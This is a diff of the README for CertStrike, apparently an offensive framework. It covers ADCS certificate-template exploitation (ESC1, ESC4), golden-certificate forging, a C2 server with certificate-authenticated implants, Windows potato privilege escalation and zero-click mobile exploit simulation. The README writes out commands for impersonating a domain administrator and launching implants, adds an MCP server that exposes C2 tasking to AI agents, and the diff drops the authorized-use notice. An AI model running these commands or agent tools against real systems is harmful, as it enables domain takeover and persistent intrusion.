@@ -1,152 +1,86 @@
 # CertStrike
 
-**Next-Gen PKI, Certificate, and Mobile Attack Framework**
-
-CertStrike is a robust, all-in-one exploitation framework specifically targeting certificate-based authentication mechanisms (PKI, Smart Cards, JWTs, mutual TLS) and mobile device extractions/C2. 
+Next-generation PKI, certificate, and mobile attack framework with integrated C2 capabilities.
 
 ## Features
 
-### 1. Certificate / PKI Attack Toolkit
-- Active directory CS (ADCS) enumeration and exploitation (ESC1-ESC11 equivalents).
-- Certificate forging and golden certificate attacks.
-- Smart Card / PIV cloning and manipulation.
-- mTLS interception and proxying.
-- Certificate transparency log correlation for exposed assets.
+### ADCS / PKI Exploitation
+- **Native LDAP enumeration** of certificate templates (no ldapsearch binary dependency)
+- **ESC1-ESC4 vulnerability detection** with automatic scoring and prioritization  
+- **ESC1 exploitation**: forge certificates with arbitrary UPN via misconfigured templates
+- **ESC4 exploitation**: modify template ACLs → exploit as ESC1 → auto-restore
+- **Attack chain auto-detection**: scan all templates, score vulnerabilities, output prioritized attack paths
+- **Golden certificate forging** with UPN SAN for smart card / Kerberos PKINIT authentication
 
-### 2. Mobile Device Exploitation & Extraction
-- **ClearBrite:** Forensic-grade logical and physical device extraction (Android/iOS).
-- **Pegasus-like zero-click simulation:** Remote exploitation vector testing.
-- **C2 Integration:** A robust C2 framework on par with Sliver, featuring multi-OS support (Linux, Windows, Android, iOS), highly obfuscated stagers, and seamless integration with the "Hog" ecosystem.
+### C2 Framework
+- HTTP/HTTPS listeners with auto-generated self-signed TLS certificates
+- Implant session management: registration, polling, command queue, result collection
+- **Certificate persistence**: cert-auth implants authenticate via forged certificates (Schannel mTLS)
+- Stager configuration generation
+
+### Mobile Exploitation
+- **ClearBrite** forensic-grade logical device extraction via ADB
+- Zero-click exploit simulation (Pegasus, Predator, Chrysaor attack chains)
+
+### MCP Server
+6 tools for agentic integration: `pki_enumerate`, `pki_forge`, `c2_list_sessions`, `c2_queue_command`, `c2_get_results`, `mobile_extract`
+
+### Operator Console
+Bubbletea-based TUI with views: Sessions, Commands, Listeners, Implants
+
+### SmartPotato
+All-in-one Windows privilege escalation: JuicyPotato, RoguePotato, SweetPotato with auto-detection
+
+## Quick Start
+
+```bash
+# Build
+CGO_ENABLED=0 go build -o certstrike ./cmd/certstrike
+
+# Enumerate ADCS templates
+./certstrike pki --enum --target-dc dc01.corp.local --domain corp.local --username user --password pass
+
+# Auto-detect ESC vulnerabilities
+./certstrike pki --auto-detect --target-dc dc01.corp.local --domain corp.local --username user --password pass
+
+# Exploit ESC1
+./certstrike pki --exploit esc1 --template VulnTemplate --upn administrator@corp.local \
+  --target-dc dc01.corp.local --domain corp.local --username user --password pass
+
+# Forge golden certificate
+./certstrike pki --forge --upn admin@corp.local --output admin.pem
+
+# Start C2 listener
+./certstrike c2 --port 8443 --protocol https
+
+# Generate cert-auth implant
+./certstrike c2 --implant-type cert-auth --upn admin@corp.local --c2-url https://c2:8443
+
+# Launch operator console
+./certstrike console
+
+# Start MCP server
+./certstrike mcp
+
+# Mobile extraction
+./certstrike mobile --extract --device-id emulator-5554 --output-dir ./extraction
+```
 
 ## Architecture
-- `cmd/certstrike`: The primary CLI and C2 server entrypoint.
-- `pkg/pki`: Core PKI, ASN.1, and X.509 manipulation libraries.
-- `pkg/mobile`: Mobile device abstraction, ADB/iOS bridging, and forensic dumping.
-- `pkg/c2`: The C2 listener, routing, and implant generation logic.
-- `implants/`: Highly obfuscated "potato" variations and native mobile implants.
-
-## Building
-
-### Using Make (Recommended)
-
-```bash
-# Build main CLI
-make build
-
-# Build SmartPotato implant
-make smartpotato
-
-# Run tests
-make test
-
-# Cross-compile for all platforms
-make cross-compile
-
-# Build everything and run tests
-make all
-```
-
-### Manual Build
-
-```bash
-go build -o certstrike ./cmd/certstrike
-go build -o implants/smartpotato/smartpotato ./implants/smartpotato
-```
-
-## Usage
-
-### PKI/Certificate Attacks
-
-```bash
-# Enumerate ADCS templates
-certstrike pki --target-dc dc01.corp.local --domain corp.local --username user --password pass --enum
-
-# Forge a golden certificate
-certstrike pki --forge --upn administrator@corp.local --ca-key ca-key.pem --output admin-cert.pem
-```
-
-### Mobile Extraction
-
-```bash
-# ClearBrite forensic extraction
-certstrike mobile --device-id emulator-5554 --extract --output-dir ./extraction
-
-# Zero-click simulation
-certstrike mobile --zero-click --target-ip 192.168.1.100 --payload-type pegasus
-```
-
-### C2 Operations
-
-```bash
-# Start HTTP listener
-certstrike c2 --bind 0.0.0.0 --port 8080 --protocol http
-
-# Start HTTPS listener with certs
-certstrike c2 --bind 0.0.0.0 --port 8443 --protocol https --cert server.crt --key server.key
-
-# Generate stager configuration
-certstrike c2 --generate-stager --output stager.json
-```
-
-### SmartPotato Implant
-
-```bash
-# Run with auto-detection
-./smartpotato auto
-
-# Specific technique
-./smartpotato juicy
-./smartpotato rogue
-```
-
-## Development
-
-### Project Structure
 
 ```
-certstrike/
-├── cmd/certstrike/          # CLI entry point and subcommands
-│   ├── main.go              # Root cobra command
-│   ├── pki.go               # PKI subcommand
-│   ├── mobile.go            # Mobile subcommand
-│   └── c2.go                # C2 subcommand
-├── pkg/
-│   ├── pki/                 # PKI/ADCS implementation
-│   │   ├── adcs.go          # Template enumeration, cert forging
-│   │   └── adcs_test.go
-│   ├── mobile/              # Mobile device ops
-│   │   ├── clearbrite.go    # ADB extraction, zero-click sim
-│   │   └── clearbrite_test.go
-│   └── c2/                  # C2 server
-│       ├── listener.go      # HTTP/HTTPS listener, session mgmt
-│       └── listener_test.go
-├── implants/
-│   └── smartpotato/         # Windows privilege escalation implant
-│       └── main.go          # RC4 decrypt, AMSI/ETW bypass, potato techniques
-├── scripts/                 # Build and test automation
-│   ├── build.sh
-│   └── test.sh
-├── Makefile                 # Build targets
-└── .gitignore
+cmd/certstrike/     CLI entry points (cobra)
+pkg/pki/            ADCS enumeration, ESC exploitation, certificate forging
+pkg/c2/             C2 listener, session management, cert-auth implants
+pkg/mobile/         ADB extraction (ClearBrite), zero-click simulation
+internal/mcp/       MCP stdio server (6 tools)
+internal/tui/       Bubbletea operator console
+implants/smartpotato/ Windows privilege escalation
 ```
 
-### Running Tests
-
-```bash
-# Run all tests
-go test ./...
-
-# Run with coverage
-go test -cover ./...
-
-# Generate coverage report
-./scripts/test.sh
-```
-
-## Security Notice
-
-This tool is designed for authorized security testing and research only. Unauthorized use against systems you do not own or have explicit permission to test is illegal.
-
-## License
-
-MIT
+## Dependencies
+All pure Go, CGO_ENABLED=0 compatible:
+- `github.com/spf13/cobra` — CLI framework
+- `github.com/go-ldap/ldap/v3` — Native LDAP client
+- `github.com/charmbracelet/bubbletea` — TUI framework
+- `github.com/charmbracelet/lipgloss` — TUI styling
